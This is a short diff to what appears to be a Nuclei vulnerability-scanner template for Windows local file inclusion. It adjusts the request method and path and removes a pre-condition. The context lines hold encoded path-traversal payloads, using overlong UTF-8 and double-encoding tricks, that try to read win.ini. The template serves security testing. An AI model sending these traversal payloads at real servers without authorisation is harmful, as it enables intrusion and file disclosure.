@@ -13,6 +13,9 @@ http:
     - bit app support
     - fonts
     - extensions
+  method: GET
+  path:
+  - '{{BaseURL}}'
   payloads:
     win_fuzz:
     - \WINDOWS\win.ini
@@ -54,10 +57,6 @@ http:
     - /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini
     - '%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini'
     - '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%5Cwin.ini'
-  pre-condition:
-  - dsl:
-    - method == "GET"
-    type: dsl
   stop-at-first-match: true
 id: windows-lfi-fuzz
 info:
